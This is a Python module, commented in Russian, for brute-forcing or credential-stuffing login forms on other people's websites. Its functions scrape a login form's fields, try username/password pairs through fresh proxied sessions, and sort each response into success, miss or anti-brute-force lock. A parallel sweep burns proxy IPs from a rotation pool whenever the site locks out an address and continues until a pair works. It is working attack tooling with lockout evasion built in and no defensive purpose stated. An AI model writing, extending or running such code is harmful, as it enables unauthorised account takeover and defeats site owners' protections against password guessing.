"""Вход формою на чужом сайте: найти поля, попробовать пару, классифицировать ответ.

В отличие от `tests_panel_login` (наша панель, кука из `.env`) это про **чужой**
сайт: форма не наша, поля неизвестны, а ответ надо разобрать — успех это, промах
или антибрутфорс-замок, и не принять одно за другое (ложное «попадание» на странице
замка стоило уже не одной пары пар).

## Что здесь есть

* `web_login_form` — разобрать форму входа: action, поля, чем пахнет неудача;
* `web_login_try` — один вход свежей сессией (прокси — отдельным транспортом),
  вердикт: успех / промах / замок;
* `web_login_sweep` — обход списка пар по пулу ротации (`http_proxy_pool_rotate`)
  до первого успеха; сгоревший IP не засчитывает пару, а берёт следующий.

Замылок антибрутфорса — часть контракта, а не происшествие: `verdict='замок'`
означает «пара НЕ проверена», и зовущий обязан повторить её с другого выхода.
"""
import asyncio
import re

import httpx

# форма неудачника выдаётся той же страницей входа — по этому признаку промах
# отличается от успеха; у замка свой маркер (обычно error_attempts в.alert)
LOGIN_LOCK = 'error_attempts'


async def web_login_form(url: str, timeout: float = 15) -> dict:
    """Разобрать форму входа страницы: action, поля (name→type), что ищет неудачу.

    Args:
        url: адрес страницы с формой (логин-панель, админка — что угодно с <form>).
        timeout: секунд на запрос.

    Returns:
        {'ok': форма найдена, 'action': адрес отправки, 'method': GET/POST,
         'fields': {name: type}, 'fail_marker': текст алерта неудачи (первый),
         'status': код ответа}
    """
    async with httpx.AsyncClient(follow_redirects=True, timeout=timeout) as c:
        r = await c.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    form = re.search(r'<form[^>]*>.*?</form>', r.text, re.S | re.I)
    if not form:
        return {'ok': False, 'action': '', 'method': '', 'fields': {},
                'fail_marker': '', 'status': r.status_code}
    tag = form.group(0)
    fields = {m.group(1): (m.group(2) or 'text').lower() for m in re.finditer(
        r'<(?:input|select|textarea)[^>]*?name="([^"]+)"[^>]*?(?:type="([^"]+)")?',
        tag, re.I)}
    alert = re.search(r'alert[^>]*>(?:<i[^>]*></i>)?\s*([^<]{5,140})<', tag, re.S)
    return {'ok': True,
            'action': re.search(r'action="([^"]*)"', tag).group(1) if re.search(
                r'action="([^"]*)"', tag) else '',
            'method': (re.search(r'method="([^"]+)"', tag, re.I) or
                       [None, 'POST'])[1].upper(),
            'fields': fields,
            'fail_marker': alert.group(1).strip() if alert else '',
            'status': r.status_code}


async def web_login_try(url: str, user: str, password: str, user_field: str = 'username',
                        pass_field: str = 'password', fail_marker: str = '',
                        form_marker: str = '', lock_marker: str = LOGIN_LOCK,
                        proxy: str = '', timeout: float = 15) -> dict:
    """Один вход парой, свежей сессией; вердикт: успех / промах / замок.

    Args:
        url: адрес формы (обычно action из `web_login_form`).
        user, password: пара.
        user_field, pass_field: имена полей (из `web_login_form`).
        fail_marker: текст неудачного входа на странице — найден значит промах.
        form_marker: кусок самой формы (id поля) — найден значит всё ещё логин.
        lock_marker: маркер замка антибрутфорса (счётчик на IP) — пара не проверена.
        proxy: 'http://ip:port' — выход через него (свой транспорт, свежий клиент).
        timeout: секунд на запрос.

    Returns:
        {'verdict': 'успех'|'промах'|'замок'|'сбой', 'status': код,
         'sign': чем подтверждён вердикт (обрывок страницы)}
    """
    try:
        kw = {'follow_redirects': True, 'timeout': timeout}
        if proxy:
            from http_.http_pool import http_pool_transport
            kw['transport'] = http_pool_transport(proxy)
        async with httpx.AsyncClient(**kw) as c:
            r = await c.post(url, data={user_field: user, pass_field: password},
                             headers={'User-Agent': 'Mozilla/5.0'})
    except httpx.HTTPError as e:
        return {'verdict': 'сбой', 'status': 0, 'sign': type(e).__name__}
    if lock_marker and lock_marker in r.text:
        return {'verdict': 'замок', 'status': r.status_code, 'sign': lock_marker}
    if fail_marker and fail_marker in r.text or form_marker and form_marker in r.text:
        return {'verdict': 'промах', 'status': r.status_code, 'sign': 'форма входа'}
    return {'verdict': 'успех', 'status': r.status_code,
            'sign': (re.search(r'<title>([^<]*)</title>', r.text) or
                    ['', ''])[0][:80]}


async def web_login_sweep(pairs: list, url: str, pool: dict,
                         user_field: str = 'username', pass_field: str = 'password',
                         workers: int = 15, **kw) -> dict:
    """Пройти пары параллельно (workers разом), каждая — со своего выхода, до успеха.

    Args:
        pairs: [('логин', 'пароль'), …] — уже без проверенных ранее.
        url: адрес формы (`web_login_form` → action).
        pool: {'next','burn'} из `http_proxy_pool_rotate`; без пула — с текущего IP.
        user_field, pass_field, kw: см. `web_login_try` (fail_marker и пр.).
        workers: сколько пар проверяется одновременно (каждая со своим адресом;
            лимит сайта на IP от этого не меняется — per_ip всё так же бережёт его).

    Returns:
        {'verdict': 'успех'|'мимо'|'исчерпан', 'hit': пара или None,
         'tested': сколько пар реально проверено, 'skipped': сколько пар не
         проверено ни разу (сгорели выходы)}
    """
    q: asyncio.Queue = asyncio.Queue()
    for pr in pairs:
        q.put_nowait(pr)
    out = {'tested': 0, 'skipped': 0, 'hit': None, 'verdict': 'мимо'}

    async def worker():
        while out['hit'] is None and out['verdict'] == 'мимо':
            try:
                user, pwd = q.get_nowait()
            except asyncio.QueueEmpty:
                return
            checked = False
            while not checked and out['verdict'] != 'исчерпан':
                proxy = pool['next']() if pool else ''
                if pool and not proxy:
                    out['verdict'] = 'исчерпан'
                    out['skipped'] += 1
                    return
                res = await web_login_try(url, user, pwd, user_field, pass_field,
                                          proxy=proxy, **kw)
                if res['verdict'] in ('замок', 'сбой'):
                    if pool:
                        pool['burn'](proxy)
                        continue
                    out['skipped'] += 1
                    break
                out['tested'] += 1
                checked = True
                if res['verdict'] == 'успех':
                    out['hit'] = (user, pwd)

    await asyncio.gather(*(worker() for _ in range(workers)))
    return {'verdict': 'успех' if out['hit'] else out['verdict'], 'hit': out['hit'],
            'tested': out['tested'], 'skipped': out['skipped']}
